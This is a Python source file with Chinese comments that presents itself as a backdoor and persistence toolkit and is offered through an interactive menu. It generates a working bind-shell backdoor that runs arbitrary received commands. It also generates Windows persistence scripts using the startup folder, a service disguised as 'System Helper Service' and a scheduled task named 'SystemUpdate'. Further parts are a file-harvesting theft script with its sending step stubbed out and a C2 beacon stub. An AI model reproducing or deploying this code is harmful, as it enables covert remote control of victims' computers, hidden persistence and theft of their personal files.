#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
后门和持久化工具
远程控制、持久化后门、数据窃取
"""

import os
import sys
import time
import socket
import threading
import subprocess
from datetime import datetime

class BackdoorPersistenceTool:
    def __init__(self):
        self.backdoor_running = False
        self.connections = []
    
    def create_simple_backdoor(self, port=4444):
        """创建简单后门"""
        print(f"🔧 创建后门服务 - 端口: {port}")
        
        backdoor_code = f'''#!/usr/bin/env python3
import socket
import subprocess
import threading
import os

class SimpleBackdoor:
    def __init__(self, host='0.0.0.0', port={port}):
        self.host = host
        self.port = port
        self.running = True
    
    def handle_client(self, client_socket):
        while self.running:
            try:
                # 接收命令
                command = client_socket.recv(1024).decode('utf-8').strip()
                
                if command.lower() == 'exit':
                    break
                elif command.lower() == 'sysinfo':
                    # 系统信息
                    info = f"系统: {os.name}\\n用户: {os.getlogin()}\\n目录: {os.getcwd()}"
                    client_socket.send(info.encode('utf-8'))
                elif command.startswith('cd '):
                    # 切换目录
                    new_dir = command[3:].strip()
                    try:
                        os.chdir(new_dir)
                        client_socket.send(f"切换到: {os.getcwd()}".encode('utf-8'))
                    except:
                        client_socket.send("目录不存在".encode('utf-8'))
                else:
                    # 执行系统命令
                    try:
                        result = subprocess.run(command, shell=True, capture_output=True, text=True)
                        output = result.stdout if result.stdout else result.stderr
                        client_socket.send(output.encode('utf-8'))
                    except Exception as e:
                        client_socket.send(str(e).encode('utf-8'))
            
            except:
                break
        
        client_socket.close()
    
    def start(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(5)
        
        print(f"后门服务启动在 {{self.host}}:{{self.port}}")
        
        while self.running:
            try:
                client_socket, addr = server.accept()
                print(f"新连接: {{addr}}")
                
                # 新线程处理客户端
                client_thread = threading.Thread(target=self.handle_client, args=(client_socket,))
                client_thread.daemon = True
                client_thread.start()
            
            except KeyboardInterrupt:
                self.running = False
            except:
                pass
        
        server.close()

if __name__ == "__main__":
    backdoor = SimpleBackdoor()
    backdoor.start()
'''
        
        # 保存后门文件
        filename = f"simple_backdoor_{datetime.now().strftime('%Y%m%d_%H%M%S')}.py"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(backdoor_code)
        
        print(f"✅ 后门文件已创建: {filename}")
        print("💡 使用方法: python " + filename)
        return filename
    
    def create_persistence_script(self, method="startup"):
        """创建持久化脚本"""
        print(f"🔧 创建持久化脚本 - 方法: {method}")
        
        if method == "startup":
            # Windows启动项
            script = f'''@echo off
REM 持久化后门 - 自动启动
cd /d "%~dp0"
python simple_backdoor_*.py
'''
            filename = "persistence_startup.bat"
            
            print("💡 Windows启动项位置:")
            print("   • %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
            print("   • C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        
        elif method == "service":
            # Windows服务
            script = f'''# 需要管理员权限安装服务
import win32serviceutil
import win32service
import win32event
import servicemanager
import socket

class BackdoorService(win32serviceutil.ServiceFramework):
    _svc_name_ = "SystemHelper"
    _svc_display_name_ = "System Helper Service"
    _svc_description_ = "提供系统帮助功能"
    
    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
    
    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)
    
    def SvcDoRun(self):
        # 在这里运行后门代码
        servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE,
                            servicemanager.PYS_SERVICE_STARTED,
                            (self._svc_name_, ''))
        self.main()
    
    def main(self):
        # 后门主逻辑
        pass

if __name__ == '__main__':
    win32serviceutil.HandleCommandLine(BackdoorService)
'''
            filename = "persistence_service.py"
        
        else:
            # 计划任务
            script = f'''schtasks /create /tn "SystemUpdate" /tr "python simple_backdoor_*.py" /sc daily /st 09:00
'''
            filename = "persistence_task.bat"
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(script)
        
        print(f"✅ 持久化脚本已创建: {filename}")
        return filename
    
    def create_data_exfiltration(self, target_files=None):
        """创建数据窃取脚本"""
        print("🔧 创建数据窃取脚本")
        
        if target_files is None:
            target_files = [
                "%USERPROFILE%\\Desktop\\*.txt",
                "%USERPROFILE%\\Documents\\*.doc*", 
                "%USERPROFILE%\\Downloads\\*.pdf",
                "%APPDATA%\\*\\*.config"
            ]
        
        script = f'''import os
import shutil
import socket
import threading
from datetime import datetime

class DataExfiltration:
    def __init__(self, server_ip='127.0.0.1', server_port=4445):
        self.server_ip = server_ip
        self.server_port = server_port
        self.target_files = {target_files}
    
    def find_sensitive_files(self):
        """查找敏感文件"""
        sensitive_files = []
        
        for pattern in self.target_files:
            expanded_pattern = os.path.expandvars(pattern)
            
            if '*' in expanded_pattern:
                # 通配符匹配
                directory = os.path.dirname(expanded_pattern)
                if os.path.exists(directory):
                    for file in os.listdir(directory):
                        if file.lower().endswith(tuple(['.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx'])):
                            full_path = os.path.join(directory, file)
                            if os.path.isfile(full_path):
                                sensitive_files.append(full_path)
            else:
                # 具体文件
                if os.path.exists(expanded_pattern):
                    sensitive_files.append(expanded_pattern)
        
        return sensitive_files
    
    def exfiltrate_data(self):
        """窃取数据"""
        files = self.find_sensitive_files()
        
        print(f"找到 {{len(files)}} 个文件")
        
        for file_path in files:
            try:
                # 这里应该是发送到远程服务器的逻辑
                # 演示目的，只打印文件信息
                file_size = os.path.getsize(file_path)
                print(f"文件: {{file_path}} ({{file_size}} bytes)")
                
                # 实际攻击中，这里会发送文件内容到攻击者服务器
                
            except Exception as e:
                print(f"处理文件失败: {{file_path}} - {{e}}")
    
    def start_monitoring(self):
        """开始监控"""
        while True:
            self.exfiltrate_data()
            time.sleep(3600)  # 每小时执行一次

if __name__ == "__main__":
    exfil = DataExfiltration()
    exfil.start_monitoring()
'''
        
        filename = f"data_exfiltration_{datetime.now().strftime('%Y%m%d_%H%M%S')}.py"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(script)
        
        print(f"✅ 数据窃取脚本已创建: {filename}")
        print("💡 实际攻击中需要配置真实的服务器地址")
        return filename
    
    def create_stealth_communication(self):
        """创建隐蔽通信通道"""
        print("🔧 创建隐蔽通信通道")
        
        script = '''import socket
import time
import random
import base64

class StealthCommunication:
    def __init__(self, c2_server='example.com', c2_port=80):
        self.c2_server = c2_server
        self.c2_port = c2_port
        
    def encode_command(self, command):
        """编码命令"""
        return base64.b64encode(command.encode('utf-8')).decode('utf-8')
    
    def decode_response(self, response):
        """解码响应"""
        return base64.b64decode(response).decode('utf-8')
    
    def beacon_checkin(self):
        """信标检查"""
        try:
            # 模拟HTTP请求作为隐蔽通信
            import urllib.request
            
            # 使用DNS或HTTP进行隐蔽通信
            # 这里只是演示，实际需要更复杂的隐蔽技术
            
            return True
        except:
            return False
    
    def start_stealth_mode(self):
        """启动隐蔽模式"""
        while True:
            if self.beacon_checkin():
                print("信标检查成功")
            else:
                print("信标检查失败")
            
            # 随机间隔，增加隐蔽性
            sleep_time = random.randint(300, 1800)  # 5-30分钟
            time.sleep(sleep_time)

if __name__ == "__main__":
    stealth = StealthCommunication()
    stealth.start_stealth_mode()
'''
        
        filename = f"stealth_communication_{datetime.now().strftime('%Y%m%d_%H%M%S')}.py"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(script)
        
        print(f"✅ 隐蔽通信脚本已创建: {filename}")
        return filename
    
    def run_backdoor_suite(self):
        """运行后门套件"""
        print("=" * 70)
        print("          后门和持久化工具")
        print("=" * 70)
        
        print("🎯 可用的后门功能:")
        print("1. 创建简单后门")
        print("2. 创建持久化脚本")
        print("3. 创建数据窃取脚本")
        print("4. 创建隐蔽通信")
        print("5. 完整后门套件")
        
        choice = input("\n请选择功能 (1-5): ").strip()
        
        if choice == "1":
            port = input("后门端口 (默认4444): ").strip()
            port = int(port) if port.isdigit() else 4444
            self.create_simple_backdoor(port)
        
        elif choice == "2":
            method = input("持久化方法 (startup/service/task): ").strip() or "startup"
            self.create_persistence_script(method)
        
        elif choice == "3":
            self.create_data_exfiltration()
        
        elif choice == "4":
            self.create_stealth_communication()
        
        elif choice == "5":
            print("\n🔧 生成完整后门套件...")
            
            # 创建所有组件
            backdoor = self.create_simple_backdoor()
            persistence = self.create_persistence_script()
            exfiltration = self.create_data_exfiltration()
            stealth = self.create_stealth_communication()
            
            print("\n📋 完整后门套件生成完成")
            print("💡 包含后门、持久化、数据窃取、隐蔽通信")
        
        else:
            print("❌ 无效选择")

def main():
    """主函数"""
    backdoor_tool = BackdoorPersistenceTool()
    
    try:
        backdoor_tool.run_backdoor_suite()
    except Exception as e:
        print(f"❌ 工具运行失败: {e}")

if __name__ == "__main__":
    main()